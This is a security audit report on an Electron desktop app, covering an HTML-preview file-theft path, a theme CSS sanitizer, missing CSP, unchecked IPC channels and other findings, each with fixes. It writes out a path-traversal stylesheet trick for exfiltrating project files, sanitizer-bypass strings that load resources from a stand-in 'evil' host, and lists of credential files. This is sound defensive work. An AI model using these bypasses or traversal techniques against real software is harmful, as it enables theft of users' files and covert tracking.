# 02 - Electron hardening, IPC bridge, displayed content -> code execution
Audit date 2026-10-30. Read-only static review. Paths relative to
`worktrees/sessions/security-audit-2026-10-30/youcoded/desktop/src` (D) unless noted.

## Bottom line
The Electron shell itself is well hardened (isolation on, node off, sandbox on, navigation locked, no webview,
no generic invoke in preload, markdown inert, docx/SVG sanitized, Office and Pages in tight sandboxes).
The real weakness is NOT "chat text becomes XSS" (I found no such path). It is that
(1) the HTML preview iframe can read project files and send them anywhere (F1), and
(2) a renderer compromise would have the full app power through ~450 un-origin-checked channels (F5) with no CSP as a second wall (F4).
Theme CSS sanitizer is bypassable (F3).

## Findings

### F1 - HIGH - HTML preview can steal project files and send them to the internet
- Attacker: anyone who can get an .html file into a folder YouCoded knows (prompt-injected assistant writing a "report/mockup", a cloned repo, a downloaded file). Needs: the user opens that HTML in the file viewer (thumbnails are script-free, only the full view runs it).
- Attack: file contains `<link rel="stylesheet" href="../../notes/secret.txt">` (also `../` any depth). Before display, `inlineLocalAssets` fetches the file via the `artifacts:read-binary` IPC and pastes its text into a `<style>` element. The page's own script reads `document.querySelector('style').textContent` and sends it out with `fetch/new Image().src`. Nothing blocks the network.
- Evidence: `renderer/components/artifact-views/html-inline-assets.ts:80-90` (stylesheet inlined, `resolveRelativeRef` folds `..` at :46-57, no extension or same-folder restriction); `HtmlView.tsx:39-44` iframe `sandbox="allow-scripts allow-popups allow-forms"` with NO CSP (grep: no CSP anywhere in the main app, see F4). Read gate = saved folders/indexed projects + small deny list: `main/artifacts/read-service.ts:630-652`, `main/artifacts/read-binary-access.ts:27-34`, `shared/artifacts/editable-path-policy.ts:28-34` (denies only .ssh/.gnupg/.aws/.azure/.kube, .netrc, .credentials.json, .env*, .config/gh). If the home folder is a saved root (the "No folder" case lands in home) everything under it is in reach.
- Mitigations: iframe is opaque-origin (cannot touch window.claude/app); sensitive-file list; 50MB cap. HtmlView comment itself says "artifacts are the user's own files" - not true for assistant-written/downloaded ones.
- Confidence: Confirmed by code read (not run).
- Fix: put a CSP meta (`default-src 'none'; connect-src 'none'; img-src data: blob:; ...`) into srcDoc as Pages already does (`renderer/components/pages/page-theme.ts:452-474`); only inline assets that live in the HTML file's own folder tree (reject refs that resolve above it); only fetch images/fonts for `<img>`, not text for `<link>/<script>` unless same folder; add `allow-popups` removal.

### F2 - MEDIUM - "Open file"/"Open in default app" runs any file type with the OS
- Attacker: prompt-injected assistant or hostile repo/download that places `something.sh/.bat/.exe/.desktop/.AppImage/.lnk/.jar` and shows a file chip; needs one user click ("Open file", "Open in default app").
- Evidence: `main/ipc/shell.ts:125-130` `shell.openPath(filePath)` with only a non-empty-string check; callers `renderer/components/context-menu/build-menu.ts:296`, `artifact-views/BinaryContent.tsx:95,105`, `BinaryFallback.tsx:33`, `SessionDrawer.tsx:529`. On Windows an .exe/.bat/.cmd/.lnk/.js runs directly; on Linux xdg-open honours executable .desktop files.
- Mitigation: user click; Windows SmartScreen for downloaded files only.
- Confidence: Confirmed (code); runtime behaviour per OS is Likely.
- Fix: in main, refuse (or ask a confirmation naming the file) for executable/script extensions and executable bit; only allow paths inside known project roots; `showItemInFolder` instead for unknown types.

### F3 - MEDIUM (Low if themes are curated by CI) - Theme CSS sanitizer is bypassable; remote CSS/tracking from a "community" theme
- Attacker: theme author. Needs: user installs the theme (or a hand-installed one).
- Proven bypasses (ran the exact regexes from `renderer/themes/theme-validator.ts:152-173`):
  `@imp@import a;ort "https://evil/x.css";` -> survives as `@import "https://evil/x.css";` (single-pass removal rebuilds the keyword);
  `image-set("https://evil/p.png" 1x)` survives (no url());
  `u\72l(https://...)` and `url(\68ttps://...)` survive (CSS escapes).
  Also `font.google-font-url` is injected into a `<link rel=stylesheet>` with NO validation: `renderer/themes/theme-engine.ts:112-119`. Unsanitized path for hand-installed themes: `state/theme-context.tsx:427` calls only `validateTheme`.
- Impact: remote stylesheet = pixel/tracking beacon (IP, install fact) and CSS attribute-selector leaks of DOM attributes (file paths, ids in data-/title attributes). No script execution. No CSP in main window to stop it (F4).
- Fix: allow-list parse (reject any `@import`, any `url(` / `image-set(` whose argument is not `theme-asset:`/`data:image/`; also strip backslash escapes first); validate google-font-url to `https://fonts.googleapis.com/`; add `img-src/style-src/font-src` CSP (F4) as the real backstop.

### F4 - MEDIUM (defence in depth) - Main app window has no Content-Security-Policy; code comments claim one exists
- Evidence: no `Content-Security-Policy` in `renderer/index.html`, `main/main.ts` (no `webRequest.onHeadersReceived`), `vite.config.ts`; only Office (`main/office/office-protocol.ts:163`) and Pages (`page-theme.ts:633`) have CSPs. Stale claims: `HtmlView.tsx:6-7` ("the app's CSP blocks loading file://"), `html-inline-assets.ts:3-4`.
- Impact: any future XSS or the theme leak (F3) has no network/script wall; `eval`/inline script unrestricted. Also no Electron fuses configured (`electron-builder.yml`: none), no `setPermissionRequestHandler` (Electron default grants permission prompts).
- Fix: ship a CSP via `session.defaultSession.webRequest.onHeadersReceived` (file:// is not covered by headers - use a `<meta>` in index.html for the packaged build and a header for dev): `default-src 'self'; script-src 'self'; connect-src 'self' ws://127.0.0.1:* ...; img-src 'self' data: blob: theme-asset:; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'none'`. Add a deny-all permission handler plus explicit allow for mic (voice). Enable fuses (RunAsNode off, EnableNodeCliInspectArguments off, OnlyLoadAppFromAsar, EmbeddedAsarIntegrityValidation).

### F5 - MEDIUM (design, impact multiplier) - ~450 IPC channels with no sender check; renderer compromise = full control
- Facts: handlers registered via `main/ipc/channel-table.ts:150-190`; `ctxFor(event)` never looks at `event.senderFrame` / URL (rg `senderFrame` in main: 0 hits). Reachable from a compromised renderer: `session:input` (type into terminal = run commands), `native:set-permission-mode` / `modes:set` (switch to Full Auto), `skills:install`, `marketplace:install`, `integrations:install`, `engine:run-in-terminal`, `remote:set-password`, `fs:read-head` (ANY readable file; desktop door is un-gated, only deny list - `main/ipc/files.ts:24-29`, `main/fs-read-head.ts`), `theme:write-file`, `project:write-context-file`, `open-path`.
- Why only Medium: I found no way to get script into the main frame (see Checked-OK). Subframes do not receive the preload (`nodeIntegrationInSubFrames` unset, `main.ts:678-683`), and top-frame navigation is pinned (`app-navigation.ts`, `main.ts:743`).
- Fix: in `ctxFor`, reject when `event.senderFrame !== event.sender.mainFrame` or its URL is not the app page (reuse `isAppPageUrl`); add a confirmation in main (not renderer) for the few catastrophic channels (set Full Auto, set remote password, install skill/plugin).

### F6 - LOW - Deny list for file reads is thin
- `SENSITIVE_*` omits `.npmrc`, `.pypirc`, `.git-credentials`, `.docker/config.json`, `.config/gcloud`, `*.pem/id_rsa/id_ed25519` outside `.ssh`, `.bash_history`, browser profiles, and YouCoded's own token/password files (`~/.claude.json`, marketplace-auth, remote password store). `shared/artifacts/editable-path-policy.ts:28-34`. Feeds F1 and any renderer-compromise read.
- Fix: widen the list and apply it also to the realpath of every desktop `fs:read-head`.

### F7 - LOW - Server-supplied URLs go to `shell.openExternal` without a scheme check
- `main/ipc/account.ts:65` (`auth_url` from the Worker), `main/ipc/remote-admin.ts:145` (Tailscale CLI output), `main/update-installer.ts:565` (`fallback download_url` from update metadata), `main/ipc/sync.ts:84` (backend URL from config). The user-facing handler has the right check (`main/ipc/shell.ts:116`, https?:// only; setWindowOpenHandler `main.ts:748-751` http/https/mailto only). On Windows `file:`/custom scheme could execute. Needs a compromised Worker/GitHub/config.
- Fix: one `safeOpenExternal(url)` helper (https/http only) used everywhere.

### F8 - LOW - Sandboxed preview/Pages frames can navigate themselves to remote sites and open popups
- HtmlView and PageHost: `allow-forms`, `allow-popups`, no navigation lock; a frame can `location='https://lookalike'` and draw a fake login inside the app's chrome. Popups are routed through the safe window-open handler (http/https only). Pages' CSP has `form-action 'none'` but not `navigate-to`.
- Fix: drop `allow-forms`/`allow-popups` from HtmlView unless needed; add `will-frame-navigate` guard (like `office-frame-guard.ts`) for any subframe not `about:srcdoc`.

### F9 - LOW (Android) - WebView file-access flags broader than needed
- `app/src/main/kotlin/com/youcoded/app/ui/AppWebView.kt:45-48` `allowFileAccess=true`, `allowFileAccessFromFileURLs=true`; page URL carries the bridge token in its query (`pageUrl`, :99-100). Mitigated: JS bridge requires that token (`bridge/HostJsBridge.kt:42-54`, noted as exposed to every frame), universal access off, mixed content blocked, debugging only in DEBUG. Not covered deeper (Android is outside my area).
- Fix: switch to `WebViewAssetLoader` (https://appassets.androidplatform.net) and turn both file flags off; keep token out of the URL.

### F10 - INFO - Theme preview generator window omits explicit `sandbox:true`
- `main/theme-preview-generator.ts:46-57`: contextIsolation on, nodeIntegration off, no preload, loads a `data:` URL built from theme content (so a theme's remote URLs would be fetched when a preview is made - same class as F3). Electron's default sandbox is on, so Info only. Add explicit `sandbox: true` and `webSecurity` default; block network with `session.webRequest` for that window.

## Checked and OK
- Window flags: the only app window factory (`main/main.ts:657-683`) sets contextIsolation true, nodeIntegration false, sandbox true; webSecurity/allowRunningInsecureContent/webviewTag/nodeIntegrationInSubFrames never set (rg across src: 0 hits). Buddy windows (all 3 kinds) use the same factory. Print window: `office/office-print.ts:44-51` sandbox+isolation+deny open+block navigate. No `<webview>`, `WebContentsView`, or `BrowserView` anywhere; the assistant Browser is an external Playwright/Chrome (`main/assistant-browser/browser-service.ts:412`), not an embedded view.
- Preload exposes no generic `invoke(channel)`; all calls are named wrappers; `PLAYABLE_PUSHES` allow-list stops arbitrary `ipcRenderer.emit` (`preload.ts:~600`). No raw fs/exec/shell primitives, only the named channels. `shell.openExternal` wrapper limited to http(s) (`ipc/shell.ts:116`).
- Navigation: `will-navigate` limited to exactly index.html/dev server (`app-navigation.ts:14-35`, `main.ts:743-745`; dropped files cannot navigate); `setWindowOpenHandler` always denies, forwards only http/https/mailto (`main.ts:748-751`); Office subframes sealed (`office/office-frame-guard.ts`).
- Chat markdown: no `rehype-raw`; raw HTML is stripped to text except a strict details/summary pair (`components/MarkdownContent.tsx:44-125`); links only http(s)/mailto with `noopener` (:437-452); remote images wait behind a Show button (prevents zero-click data exfil) with URL-constructor parsing (:280-330). No mermaid/KaTeX usage found.
- `dangerouslySetInnerHTML` sites: DocxView uses DOMPurify private instance, fails closed, strips non-http(s) hrefs (`artifact-views/sanitize-doc-html.ts`); mascot/buddy SVG go through 3-pass sanitizer, fails closed (`mascot/sanitize-rig-svg.ts`); Image viewer uses blob `<img>` so SVG scripts do not run (`ImageView.tsx`). Thumbnails use `sandbox=""` (`ArtifactThumbnail.tsx:233`).
- Pages iframe: opaque origin, strict CSP (`connect-src 'none'`, `frame-src 'none'`, webrtc block, `page-theme.ts:452-474`); every postMessage checked `e.source === frame.contentWindow` (`PageHost.tsx:309`, `use-page-sockets.ts:41`); session-start/chats/program require stored approval AND a fresh click inside the frame (`PageHost.tsx:333-360`); network goes through main with per-connection approvals and per-hop redirect checks (`main/pages/page-fetch.ts` header + :163-167).
- Office editor: own origin per document token, `sandbox ... allow-same-origin` only on `office:` origin (not the app's), message handler checks `e.origin` AND `e.source` (`EditorFrame.tsx:~815`), CSP with no network, `serveConfined` does realpath containment, `..%2f` handled, picture downloads SSRF-checked (`office/office-protocol.ts:38-90,163`).
- `theme-asset://`: slug regex blocks `..`/hostname tricks, lexical AND realpath containment (symlinks), allowed ext->MIME, no HTML served (`theme-protocol.ts:34-62`). Android twin checks canonicalPath (`AppWebView.kt:111-113`).
- Artifact write path: symlink resolution + in-root + tier policy + mtime token (`ipc/artifacts.ts:364-428`, `artifacts/write-authorization.ts`); read-binary resolves realpath before root check (`read-service.ts:634-650`); `fs:read-head` realpath + deny list (`fs-read-head.ts:14-26`); theme write validates slug (`ipc/appearance.ts:74-81`).
- Update installer: host allow-list (github release hosts, https), extension allow-list, signed manifest verified before launch (`update-installer.ts:25-52`, `update-service.ts:423-440`).
- Phone/remote door: every channel has declared desktopOnly/remoteAllowed/guards enforced in one place (`channel-table.ts:~200-240`, `ipc/file-gates.ts`) - covered by another auditor in depth.
- Android bridge: token-gated JavascriptInterface, noted as exposed to all frames (`bridge/HostJsBridge.kt:42-54`).

## Not covered / hand-offs
- Remote web door (`remote-server.ts`, WebSocket auth) and Worker: other specialists.
- Playwright "Browser" tool net rules (`assistant-browser/browser-net.ts`) looked sound at a glance, not audited.
- Nothing was executed except a pure-regex string test of the CSS sanitizer in node (no app, no network).
